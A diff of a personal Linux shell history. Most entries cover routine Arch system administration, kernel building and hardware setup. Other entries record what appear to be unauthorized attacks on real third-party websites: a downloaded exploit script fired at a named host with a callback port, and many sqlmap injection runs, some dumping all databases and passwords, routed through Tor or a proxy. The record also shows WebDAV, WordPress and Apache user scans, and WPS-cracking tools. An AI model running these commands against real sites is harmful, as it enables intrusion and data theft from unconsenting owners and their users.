@@ -1,422 +1,3 @@
-yaourt bitbee
-yaourt bitlbee
-cd .scripts/
-ls
-./archinfo.sh 
-./battery.sh 
-./mpd_to_usb.sh 
-./pipes.sh 
-./pipes.sh -e
-./pipes.sh --help
-./pipes.sh -c
-ls
-./moon.sh 
-./pacman.sh 
-./termbinget.sh 
-curl http://ix.io
-./pallete.sh 
-ls
-./showImage.sh 
-subl3./showImage.sh 
-subl3 ./showImage.sh 
-yaourt screenfeetch
-yaourt screen
-yaourt screenfetch
-screenfetch 
-cd .scripts/
-screenfetch && ./pacman.sh 
-vim
-sudo pacman -S vim
-vim
-nano teste.c 
-exit
-vim
-v
-vim
-cd .scripts/
-ls
-./moon.sh 
-./pallete.sh 
-ls
-./pacman.sh 
-ls
-vim
-sudo systemctl stop tlp
-revoot
-sudo systemctl disable tlp
-wash -i wlan0
-wash -i wlan0mon
-sudo wash -i wlan0mon
-exit
-iwconfig 
-sudo -s
-sudo .s
-sudo -s
-sudo pacman -Syu
-yaourt i3-gaps
-git clone git://github.com/Airblader/i3#branch=gaps-next
-exit
-git clone git://github.com/spf13/spf13-vim.git
-yaourt i3-gaps
-ls /tmp/
-ls /tmp/yaourt-tmp-emanuelx/
-ls /tmp/yaourt-tmp-emanuelx/aur-i3-gaps-next-git/
-sudo pacman -S ruby
-sudo pacman -Syu ruby
-gem install jekyll
-jekyll blog-emanuelx
-jekyll new blog-emanuelx
-cd blog-emanuelx/
-ls
-jekyll serve
-sudo jekyll serve
-jekyll serve
-echo fs.inotify.max_user_watches=524288 | sudo tee /etc/sysctl.d/40-max-user-watches.conf && sudo sysctl --system
-jekyll serve
-wget #!/bin/sh
-#AccuWeather (r) RSS weather tool for conky
-#
-#USAGE: weather.sh <locationcode>
-#
-#(c) Michael Seiler 2007
-METRIC=0 #Should be 0 or 1; 0 for F, 1 for C
-if [ -z $1 ]; then     echo;     echo "USAGE: weather.sh <locationcode>";     echo;     exit 0; fi
-cd /opt/
-rm 123.dic 
-sudo rm 123.dic 
-sudo rm 1231234.dic 
-sudo rm 12dfghj.dic 
-sudo rm 12121231231234.dic 
-exit
-ls /usr/local/netbeans-8.1/bin/netbeans
-/usr/local/netbeans-8.1/bin/netbeans
-bash
-exit
-wget https://raw.githubusercontent.com/rgoomar/i3-wm-config/master/weather.sh
-chmod +x ./weather.sh 
-./weather.sh 
-./weather.sh 273891
-cat weather.sh 
-http://weather.yahooapis.com/forecastrss?w=742627&amp;u=c
-curl -s 'http://weather.yahooapis.com/forecastrss?w=742627&amp;u=c'
-sudo pacman -Ss gpointing
-sudo pacman -S gpointing-device-settigns
-sudo pacman -S gpointing-device-settings
-gpointing-device-settings 
-exit
-jekyll new site_teste
-exit
-jekyll build
-.s
-ls
-cd /opt/
-ls
-cd pt/
-ls
-sudo pacman -Rs teamspeak3 
-cd
-bitlbee 
-sudo pacman -Syu pidgin
-gsettings get org.gnome.settings-daemon.peripherals.touchpad disable-while-typing
-cd blog-emanuelx/
-jekyll --help
-jekyll serve
-sudo systemctl status suspend@emanuelx
-netbeans &&
-netbeans
-git clone https://github.com/jgeboski/bitlbee-facebook.git
-cd bitlbee-facebook/
-./autogen.sh 
-make
-make install
-sudo make install
-cd
-export BITLBEE_CFLAGS="-I$HOME/bitlbee/include/bitlbee"
-export BITLBEE_LIBS=""
-bitlbee 
-sudo -s
-pkill google-chrome
-ps -aux | google
-ps -aux | grep google
-pkill chrome
-ps -aux
-kill -9 4053
-sudo -s
-exit
-vim
-exit
-sudo pacman -Syu
-ssh emanuelx.dynip.sapo.pt
-sudo pacman -Syu
-yaourt linux
-ls
-wget https://cdn.kernel.org/pub/linux/kernel/v4.x/linux-4.4.tar.xz
-cd linux-4.4/
-make mrproper
-sudo pacman -S xmlto
-sudo pacman -S docbook-xsl kmod inetutils bc
-make mrproper
-ls
-exit
-ls
-cd linux-4.4/
-ls
-make mrproper 
-make menuconfig
-make
-sudo make modules install
-ls
-cd arch/
-ls
-cd x86_64/
-ls
-cd boot/
-ls
-sudo cp -v bzImage /boot/vmlinuz-4.4
-ls /boot/
-cd
-cd linux-4.4/
-sudo mkinitcpio -k 4.4 -c /etc/mkinitcpio.conf -g /boot/initramfs-4.4.img
-sudo mkinitcpio -k 4.4.0 -c /etc/mkinitcpio.conf -g /boot/initramfs-4.4.img
-sudo mkinitcpio -k 4.4.0 -c /etc/mkinitcpio.conf -g /boot/initramfs-4.4.0.img
-make modules_install 
-sudo make modules_install 
-sudo mkinitcpio -k 4.4.0 -c /etc/mkinitcpio.conf -g /boot/initramfs-4.4.0.img
-ls /lib/modules/4.3.3-2-ARCH/
-nano /etc/mkinitcpio.conf 
-sudo cp -r /lib/modules/4.3.3-2-ARCH/extramodules /lib/modules/4.4.0/extramodules
-sudo mkinitcpio -k 4.4.0 -c /etc/mkinitcpio.conf -g /boot/initramfs-4.4.0.img
-make M=bbswitch
-make M=nouveau
-sudo cp /etc/mkinitcpio.conf /etc/mkinitcpio_custom.conf
-sudo nano /etc/mkinitcpio_custom.conf
-sudo mkinitcpio -k 4.4.0 -c /etc/mkinitcpio_custom.conf -g /boot/initramfs-4.4.0.img
-sudo cp System.map /boot/System.map-4.4.0
-sudo grub-mkconfig -o /boot/grub/grub.cfg
-ls /boot/
-sudo cp -v bzImage /boot/vmlinuz-4.4.0
-sudo cp -v arch/x86_64/boot/bzImage /boot/vmlinuz-4.4.0
-rm /boot/vmlinuz-4.4
-sudo rm /boot/vmlinuz-4.4
-ls /boot/
-sudo mkinitcpio -k 4.4.0 -c /etc/mkinitcpio_custom.conf -g /boot/initramfs-4.4.0.img
-sudo grub-mkconfig -o /boot/grub/grub.cfg
-uname -r
-sudo -s
-exit
-systemd-analyze 
-systemd-analyze blame
-yaourt slim
-yaourt -Syua
-ls /usr/share/xsessions/
-nano ~/.xinitrc 
-exit
-sudo -s nano /etc/slim.conf 
-journalctl -f
-sudo systemctl enable gdm
-sudo systemctl disable slim
-sudo systemctl status gdm
-sudo systemctl enable gdm
-reboot
-journalctl -f
-mixer sset Master unmute
-amixer sset Master unmute
-sudo -s
-pkill clementine
-kill -9 clementine
-ps -aux | grep clementine
-kill -9 3914
-yaourt -Syua
-nano ~/.config/gtk-3.0/settings.ini 
-sudo pacman -Syu
-sudo nano /etc/pacman.conf 
-pacman-key -r 5EE46C4C && pacman-key --lsign-key 5EE46C4C
-sudo pacman-key -r 5EE46C4C && pacman-key --lsign-key 5EE46C4C
-sudo -s
-systemd-analyze blame
-systemd-analyze
-sudo -s
-systemd-analyze 
-reboot
-systemd-analyze 
-reboot
-systemd-analyze 
-yaourt bbswic
-yaourt bbswitch
-ls /boot/
-sudo -s
-systemd-analyze 
-journalctl -u boot
-journalctl -u
-journalctl -f
-journalctl 
-sudo nano /boot/grub/grub.cfg
-systemd-analyze 
-journalctl -k -b -1
-sudo nano /etc/mkinitcpio.conf 
-sudo mkinitcpio -p linux
-sudo mkinitcpio -p linux-ck
-systemd-analyze 
-systemd-analyze blame
-sudo systemctl disable sshdgenkeys
-sudo systemctl disable sshdgenkeys.service
-systemd-analyze blame
-systemd-analyze
-cd Transferências/
-jar -x IOATrainingTool.jar 
-java -jar IOATrainingTool.jar 
-nslookup ead.ipleiria.pt
-man nslookup 
-ping ead.ipleiria.pt
-ping ead.ipleiria.pt -c 3
-nslookup bb.ued.ipleiria.pt
-nslookup ns.ipleiria.pt
-ping ns.ipleiria.pt
-cd Transferências/
-java -jar IOATrainingTool.jar 
-yaourt i3-gaps
-yaourt help
-netbeans 
-man yaourt 
-yaourt i3-gaps --conflit
-yaourt i3-gaps --conflits
-man yaourt
-yaourt i3-gaps --conflicts
-yaourt help
-yaourt --help
-yaourt --stats
-yaourt i3-gaps
-pacman -Qs | grep i3
-journalctl -f
-sudo pacman -Syu
-stremio --help
-sudo pacman -S nvidia-ck
-sudo pacman -Ss nvidia-ck
-sudo pacman -Ss nvidia-ck-ivybridge
-sudo pacman -S nvidia-ck-ivybridge
-yaourt -Syua
-sudo pacman -Syu
-sudo rm /var/cache/pacman/pkg/confuse-2.7-3-x86_64.pkg.tar.xz 
-sudo pacman -Syu
-sudo pacman -Syy
-sudo pacman -c
-sudo pacman -Sc
-sudo pacman -Syy
-sudo pacman -Syu
-sudo pacman-key --refresh-keys
-rm -R /etc/pacman.d/gnupg
-sudo rm -R /etc/pacman.d/gnupg
-sudo -s
-man stremio 
-stremio 
-pkill stremio
-ps -aux | grep stremio
-kill -9 28038
-kill -9 28039
-kill -9 28041
-kill -9 28067
-stremio 
-kup ns.ipleiria.pt
-ping ns.ipleiria.pt
-cd Transferências/
-java -jar IOATrainingTool.jar 
-yaourt i3-gaps
-yaourt help
-netbeans 
-man yaourt 
-yaourt i3-gaps --conflit
-yaourt i3-gaps --conflits
-man yaourt
-yaourt i3-gaps --conflicts
-yaourt help
-yaourt --help
-yaourt --stats
-yaourt i3-gaps
-pacman -Qs | grep i3
-journalctl -f
-yaourt -Syua
-sudo iwlist wlan0 scan
-sudo iwlist wlan0 scan | grep ESSID
-sudo iwlist wlan0 scan
-sudo pacman -S zenmap
-sudo pacman -Ss zenmap
-sudo pacman -Ss nmap
-sudo pacman -S nmap
-zenmap 
-sudo zenmap
-ssh host.dynip.sapo.pt
-sudo pacman -S nmap
-sudo pacman -S zmap
-zmap 
-sudo pacman -Rs zmap
-wget http://downloads.securityfocus.com/vulnerabilities/exploits/70103.pl
-chmod +x 70103.pl 
-./70103.pl 
-./70103.pl http://host.dynip.sapo.pt/cgi-bin/test.cgi 127.0.0.1 31337
-./70103.pl http://host.dynip.sapo.pt cgi-bin/test.cgi 127.0.0.1 31337
-netbeans 
-netbeans --jdkhome
-sudo pacman -Qs | grep netbeans
-sudo pacman -Qs | grep netbean
-sudo yaourt netbean
-sudo yaourt netbeans
-pacman -Ss netbeans
-cd Transferências/
-sh netbeans-8.1-php-linux-x64.sh 
-cd
-whereis netbeans
-cd /usr/local/netbeans-8.1/
-ls
-sudo sh uninstall.sh 
-cd
-sudo pacman -Ss netbeans
-sudo pacman -S netbeans
-dropbox 
-sudo pacman -Syu
-sudo pacman -S package-query
-sudo pacman -Ss package-query
-yaourt -Ss package-query
-yaourt -Syua
-yaourt -Su
-yaourt -S package-query
-yaourt -Syua
-lsblk
-sudo gparted
-ls /dev/loop-control 
-cd Transferências/
-mkdir /tmp/windows
-mount Win10_1511_N_Portuguese_x64.iso /tmp/windows/
-sudo mount Win10_1511_N_Portuguese_x64.iso /tmp/windows/
-sudo pacman -S fuseiso
-sudo nautilus-action
-sudo pacman -S nautilus-action
-sudo pacman -S nautilus-actions
-nautilus -q
-ls
-sudo mount -o loop  -t Win10_1511_N_Portuguese_x64.iso /tmp/windows/
-sudo mount -o loop  -t Win10_1511_N_Portuguese_x64.iso /media/disk/
-cd
-nano ~/.xinitrc 
-cd Transferências/
-ls
-dd bs=4M if=Win10_1511_N_Portuguese_x64.iso of=/dev/sdb status=progress && sync
-unetbootin
-sudo pacman -Syu
-sudo pacman -Syyu
-sudo pacman -Syu
-sudo nano /etc/pacman.d/mirrorlist
-sudo nano /etc/pacman.conf 
-sudo pacman -Syyu
-sudo pacman -Ss bbswitch
-sudo pacman -Ss ck
-wget http://software-download.microsoft.com/pr/Win10_1511_N_Portuguese_x64.iso?t=b5724750-b25f-4b0f-8045-63fd7106f676&e=1455290980&h=021297f34b5fc0645bbb703069d2655c
-ls
-unetbootin
-dd bs=4M if=Transferências/Win10_1511_N_Portuguese_x64.iso of=/dev/sdb status=progress && sync
-sudo nautilus
-nano ~/.xinitrc 
-mkdir /home/emanuelx/windows10
-fuseiso Transferências/Win10_1511_N_Portuguese_x64.iso /home/emanuelx/windows10/
 fuseiso -h
 fuseiso -h /home/emanuelx/windows10/
 fuseiso -u /home/
@@ -1998,3 +1579,422 @@ ls
 java -jar PursuitDomain.jar 
 cd
 youtube-dl https://www.youtube.com/watch?v=kkx-7fsiWgg
+.scripts/rmod_nvidia.sh 
+alsamixer 
+sudo pacman -Syu
+sudo pacman -S install cppcheck
+dotfiles/update.pl 
+subl3 dotfiles/update.pl 
+dotfiles/update.pl 
+npm install jshint
+npm install -g htmlhint@latest
+sudo npm install -g htmlhint@latest
+php -l
+phpcs
+phpcs --version
+phpmd
+phpmd --version
+sudo nano /etc/php/conf.d/php
+sudo nano /etc/php/php.ini
+phpmd --version
+sheck
+yaourt scheck
+php-cs-fixer
+pacman -Ss php-cs-fixer
+yaourt php-cs-fixer
+yaourt php-cs-fixer-git
+sudo pacman-key -r 293D771241515FE8
+sudo pacman-key --init
+sudo -s
+yaourt php-cs-fixer
+sudo pacman-key -r 293D771241515FE8
+gpg --list-keys
+sudo gpg --list-keys
+pacman-key -r 293D771241515FE8
+gpg --recv-keys 293D771241515FE8
+sudo gpg --recv-keys 293D771241515FE8
+gpg --recv-keys 293D771241515FE8
+yaourt php-cs-fixer-git
+alsamixer 
+alsamixer -c 0
+alsamixer --help
+man alsamixer
+amixer 
+alsamixer 
+amixer 
+cat /proc/asound/version
+journalctl -f
+sudo nano /etc/modprobe.d/webcamera.conf 
+sudo nano /etc/modprobe.d/alsa-base.conf 
+exit
+alsamixer 
+sudo nano /etc/modprobe.d/alsa-base.conf 
+alsamixer -c 0
+alsamixer
+sudo nano /etc/modprobe.d/alsa-base.conf 
+lsblk
+lsacpi
+lspci
+exit
+pacman -Ss sqlmap
+sudo pacman -S sqlmap
+sqlmap --help
+sqlmap -u "http://www.supra.pt/?section=submodule&sub=display&submodule_id=" --batch --pas
+sudo pacman -S sqlitebrowser
+sqlmap -u "http://www.supra.pt/?section=product&sub=directsearch&hiddenw=1" --data "key=cenas#1* --dbs --random-agent
+
+sqlmap -u "http://www.supra.pt/?section=product&sub=directsearch&hiddenw=1" --data "key=cenas#1*" --dbs --random-agent
+sqlmap -u "http://www.supra.pt/?section=product&sub=directsearch&hiddenw=1" --data "key=#1*" --dbs --random-agent
+sqlmap -u "http://www.supra.pt/?section=user&sub=login&goto=" --data "formname=userform&p0=email:_notnull__email_&email=#2&p1=password:_notnull__password_&password=#1*&submit=Entrar&checkindex=2" --dbs --random-agent
+clear
+sqlmap -u "http://www.supra.pt/?section=user&sub=login&goto=" --data "formname=userform&p0=email:_notnull__email_&email=#2&p1=password:_notnull__password_&password=#1*&submit=Entrar&checkindex=2" --dbs --random-agent
+sqlmap -u "http://www.supra.pt/?section=user&sub=login&goto=" --data "formname=userform&p0=email:_notnull__email_&email=#2&p1=password:_notnull__password_&password=#1*&submit=Entrar&checkindex=2" --random-agent
+sqlmap -u "http://www.supra.pt/?section=submodule&sub=display&submodule_id=" --batch --pas --dbs --users --passwords --tables --databases --dump-all
+sqlmap -u "http://www.supra.pt/?section=submodule&sub=display&submodule_id=" --batch --pas --dbs --users --passwords --tables --dump-all
+pacman -Ss tor
+sudo pacman -S tor
+sudo pacman -S privoxy
+sqlmap -u "http://www.supra.pt/?section=submodule&sub=display&submodule_id=" --tor --random-agent
+tor
+chown --help
+chown emanuelx /var/lib/tor
+sudo chown emanuelx /var/lib/tor
+tor
+sqlmap -u "http://www.supra.pt/?section=submodule&sub=display&submodule_id=" --tor --random-agent
+privoxy 
+privoxy --help
+privoxy --config-test
+ls /etc/privoxy/
+cd /etc/privoxy/
+ls
+cat config 
+sudo cat config 
+sudo cp config /home/emanuelx/config
+privoxy --config-test
+sudo privoxy --config-test
+cd
+sudo chown /home/emanuelx/config
+sudo chown emanuelx /home/emanuelx/config
+privoxy -
+privoxy --config-test
+tor
+sqlmap -u "http://www.supra.pt/?section=submodule&sub=display&submodule_id=" --tor --random-agent
+sudo pacman -S vidalia
+sudo pacman -Ss vidalia
+sudo pacman -Ss Vidalia
+yaourt -Ss Vidalia
+yaourt -S Vidalia
+yaourt -S vidalia
+sqlmap -u "si.esgt.ipsantarem.pt/esgt_si/inscricoes_turmas_LISTAGEM.FOTOS?p_a_lectivo=" --random-agent
+sqlmap -u "http://si.esgt.ipsantarem.pt/esgt_si/inscricoes_turmas_LISTAGEM.FOTOS?p_a_lectivo=" --random-agent
+sqlmap -u "http://estudantes.ipleiria.pt/Pages//resultados.aspx?k=" --random-agent
+sqlmap -u "http://atb23.net/index.php?c=&rede=pesquisar&p=" --random-agent
+sqlmap -u "http://si.esgt.ipsantarem.pt/esgt_si/" --random-agent
+sqlmap -u "http://atb23.net/index.php" --data "user=#1&pass=#2&button=Entrar"" --random-agent
+sqlmap -u "http://atb23.net/index.php" --data "user=#1&pass=#2&button=Entrar" --random-agent
+sqlmap -u "http://atb23.net/index.php?conteudo=professor&area=" --random-agent
+pkill firefox
+sqlmap -u "http://mrpiracy.club/filmes.php?categoria=" --random-agent
+sqlmap -u "https://sembilhete.tv/search/?query=" --random-agent
+sqlmap -u "http://www.legendas-zone.org/legendas.php?s=" --random-agent
+scilab 
+exit
+sqlmap --help
+pacman -Ss arduino
+yaourt -Ss arduino
+yaourt -S arduino
+sudo gpasswd -a emanuelx uucp 
+sudo gpasswd -a emanuelx lock
+lsacpi
+lspci
+modprobe cdc_acm
+sudo modprobe cdc_acm
+cat </dev/ttyUSB0
+ls -l /dev/ | grep ttyUSB0
+groups
+ls -l /dev/ | grep ttyUSB0
+lsmod | grep cdc
+sudo modprobe cdm_acm
+sudo modprobe cdc_acm
+dmesg 
+groups
+ls /dev/
+sudo ls /dev/tty
+sudo ls /dev/
+pacman -Ss rxtx
+pacman -S rxtx
+sudo pacman -S rxtx
+subl3 ~/.arduino15/preferences.txt 
+sudo chown emanuelx /dev/ttyUSB0
+sudo nano /etc/udev/rules.d/50-embedded_devices.rules
+sudo udevadm trigger
+sudo udevadm
+sudo udevadm --help
+sudo udevadm monitor
+dmesg 
+avrdude --help
+lsmod | grep cdc
+whereis esplorer
+ls /usr/bin/esplorer 
+cat /usr/bin/esplorer 
+cd /usr/share/java/esplorer/
+ls
+cd
+iwlist -a wlan0
+iwlist -i wlan0
+iwlist 
+iwlist wlan0 scanning
+ls /dev/tty
+ls /dev/ | grep ttyUSB0
+ls /dev/
+iwlist wlan0 scanning
+ls /dev/tty
+cat /dev/ttyUSB0 
+cat </dev/ttyUSB0 
+
+ls /dev/tty
+sudo modprobe cdc_mbim 
+lsmod | cdc
+esplorer 
+ls /dev/ttyUSB0 
+ls /dev/
+ls /dev/tty
+dmesg 
+journalctl -f
+sqlmap -u "http://www.mega-mania.com.pt/resultados/?pesquisa=" --random-agent
+yaourt scheck
+yaourt Scheck
+yaourt php-cs
+gpg --recv-keys 293D771241515FE8
+yaourt php-cs
+sudo pacman -Ss vidalia
+yaourt vidalia
+sqlmap -u "http://www.mega-mania.com.pt/resultados/?pesquisa=" --random-agent --proxy=http://13.79.159.2:80
+sudo subl3 /etc/udev/rules.d/52-nodemcu.rules
+dmesg 
+ls /dev/tty
+dmesg 
+nano /etc/avrdude.conf 
+ls /dev/
+ls /dev/serial/by-id/usb-1a86_USB2.0-Serial-if00-port0 
+cat /dev/serial/by-id/usb-1a86_USB2.0-Serial-if00-port0 
+tail -f /dev/serial/by-id/usb-1a86_USB2.0-Serial-if00-port0 
+ls /dev/
+ls /dev/udev
+idalia
+sqlmap -u "http://www.mega-mania.com.pt/resultados/?pesquisa=" --random-agent --proxy=http://13.79.159.2:80
+sudo subl3 /etc/udev/rules.d/52-nodemcu.rules
+ls /dev/nodemcu/
+ls /etc/udev/rules.d/52-nodemcu.rules 
+sudo nano /etc/udev/rules.d/52-nodemcu.rules 
+udevadm control --reload
+sudo -s
+exit
+udevadm info -a -p $(udevadm info -q path -n /dev/ttyUSB0)
+dmesg 
+journalctl -f
+dmesg 
+ls /dev/
+nano /etc/udev/rules.d/52-nodemcu.rules 
+cat /etc/udev/rules.d/52-nodemcu.rules 
+ls /dev/serial
+ls /dev/
+sudo mkdir /dev/nodemcu
+ls /dev/
+dmesg 
+ls /dev/nodemcu/
+dmesg 
+udevadm trigger
+dmesg 
+udevadm trigger
+dmesg 
+sudo -s
+yaourt laptop
+sudo -s
+dmesg 
+cow
+sudo pacman -S cow
+sudo pacman -Ss cow
+sudo pacman -Ss cowsay
+sudo pacman -S cowsay
+cowsay 
+cowsay help
+cowsay --help
+cowsay -b 1
+cowsay -b 2
+cowsay -d 2
+cowsay -g 2
+cowsay -g ola
+cowsay -h ola
+cowsay -h
+cowsay -p -h
+cowsay -p
+cowsay -p ola
+cowsay -p ola -h
+cowsay -p ola -h -e
+cowsay -p ola -h -e eyes
+cowsay -h -e eyes
+cowsay -e eyes
+cowthink 
+cowthink -p as
+sqlmap -u "https://arena.davidgouveia.net/challenge/index.php?username=admin&password="
+./davtest.pl 
+./davtest.pl -url http://supra.pt
+./davtest.pl -url http://www.supra.pt/contents/images/resized/
+./davtest.pl -url http://www.supra.pt/contents/images/
+./davtest.pl -url http://www.supra.pt/contents/
+./davtest.pl -url http://www.supra.pt/contents/downloads/
+./davtest.pl -url http://www.supra.pt/contents/emails/
+./davtest.pl -url http://www.supra.pt/contents/system/
+./davtest.pl -url http://www.supra.pt/contents/system/ -move
+./davtest.pl -url http://www.supra.pt/contents/
+./davtest.pl -url http://www.supra.pt/
+./davtest.pl -url www.supra.pt/
+yaourt fimap
+pacman -Ss fimap
+yaourt grabber
+cd ../grabber
+cd ../Grabber
+ls
+python grabber.py 
+python2 grabber.py 
+python2.7 grabber.py 
+sudo pacman -S python2-beautifulsoup3
+python2.7 grabber.py 
+python2.7 grabber.py --help
+python2.7 grabber.py -u http://www.supra.pt/?section=product&sub=view&product_id= -b -x -s
+python2.7 grabber.py -u http://www.supra.pt/?section=product&sub=view&product_id= -b
+python2.7 grabber.py -u http://www.supra.pt/?section=product&sub=view&product_id= -x
+python2.7 grabber.py -x -u http://www.supra.pt/?section=product&sub=view&product_id=
+python2.7 grabber.py -xbs -d 1 -u http://www.supra.pt/?section=product&sub=view&product_id=
+yaourt apache-users
+apache-users 
+ping supra.pt
+apache-users -h 109.71.43.177 -p 80 -s 0 -e 403 -t
+apache-users -h 109.71.43.177 -l basjks huasksa csasasa -p 80 -s 0 -e 403 -t
+apache-users -h 109.71.43.177 -l basjks huasksa csasasa -p 80 -s 0 -e 403
+yaourt davtest
+cd Downloads/
+unzip davtest-1.0.zip 
+cd davtest-1.0/
+ls
+./davtest.pl 
+pacman -Ss http::dav
+pacman -Ss perl-dav
+yaourt dav
+sudo pacman -Ss perl-http-dav
+yaourt -Ss perl-http-dav
+yaourt -Ss perl-http*
+yaourt -Ss *dav*
+pacman -Ss *dav*
+pacman -Ss dav*
+pacman -Ss dav
+perl -MCPAN -e shell
+./davtest.pl 
+bash
+yaourt parsero
+yaourt wpscan
+wpscan --help
+wpscan -u http://www.ipleiria.pt/
+wpscan --help
+ping supra.pt
+wpscan -u http://startupdesign.pt
+cd Downloads/davtest-1.0/
+./davtest.pl 
+./davtest.pl -u www.startupdesign.pt/wp-content/uploads/2012/07/
+./davtest.pl -url www.startupdesign.pt/wp-content/uploads/2012/07/
+wpscan -url http://www.startupdesign.pt/
+wpscan -url "http://www.startupdesign.pt/"
+wpscan -url "http://www.startupdesign.pt"
+c
+cd
+wpscan --help
+wpscan --url "www.startupdesign.pt"
+wpscan --url "www.startupdesign.pt" -p
+wpscan --url "www.startupdesign.pt" --p
+wpscan --help
+wpscan --url "www.startupdesign.pt" --e p
+wpscan --url "www.startupdesign.pt" --enumerate p
+sqlmap -u "http://supra.pt/startup/produto/"
+sudo pacman -S kodi
+pkill kodi
+pkill kodi.bin 
+ps -aux kodi
+ps aux kodi
+ps --aux kodi
+ps --aux
+ps aux
+pkill kodi.bin
+kill -9 10507
+sudo pacman -S pipelight
+sudo pacman -Ss pipelight
+yaourt -S pipelight
+sudo pacman -R wine
+sudo pacman -R winetricks wine
+yaourt -S pipelight
+yaourt -Sy
+yaourt -S pipelight
+pipelight-plugin --update
+pipelight-plugin --enable plugin
+pipelight-plugin --create-mozilla-plugins
+sudo pipelight-plugin --create-mozilla-plugins
+wget https://raw.githubusercontent.com/kvz/bash3boilerplate/master/main.sh
+subl3 main.sh 
+sh ./main.sh 
+sqlmap -u "http://www.carsportif.com/index.php?route=product%2Fsearch&filter_name="
+sqlmap -u "http://www.sportino.pt/site_lista_artigos_pesquisa.php?pesquisa="
+sqlmap -u "http://www.sportino.pt/site_lista_artigos_pesquisa.php?pesquisa='"
+sqlmap -u "http://www.sportino.pt/site_lista_artigos_pesquisa.php?pesquisa=cenas"
+sudo pacman -Ss bully
+yaourt -Ss bully
+yaourt -S bully
+bully --help
+yaourt reaver
+sudo pacman -Rs reaver
+yaourt reaver
+.scripts/rmod_nvidia.sh 
+sudo pacman -Syu
+r
+R
+journalctl -f
+whereis spotify
+journalctl /usr/bin/spotify
+journalctl /usr/local/bin/spotify
+journalctl /usr/share/spotify
+exit
+sudo pacman -Syu
+yaourt -Syua
+yaourt -Sy spotify
+spotify 
+cd Documents/
+cd snapchat/AdvancedApkTool/
+java -jar apktool_2.1.1.jar 
+java -jar apktool_2.1.1.jar d casper.apk -o 4-Done/casper
+Xorg :0 -configure
+Xorg :1 -configure
+Xorg :8 -configure
+exit
+mkfontscale 
+mkfontdir 
+ls /usr/share/fonts/
+ls /usr/share/fonts/100dpi/
+mkfontscale --help
+cd /usr/share/fonts/100dpi/
+mkfontdir 
+sudo mkfontdir 
+ls
+cd ..
+cd 75dpi/
+sudo mkfontdir 
+ls
+cat /proc/acpi/bbswitch 
+cat /etc/X11/xorg.conf
+Xorg :0 -configure
+cat /var/log/Xorg.0.log
+journalctl -b
+sudo pacman -S vulkan-intel
+systool -m i915 -av
+nano /etc/X11/xorg.conf
+sudo nano /etc/X11/xorg.conf
+.scripts/rmod_nvidia.sh 
+exit
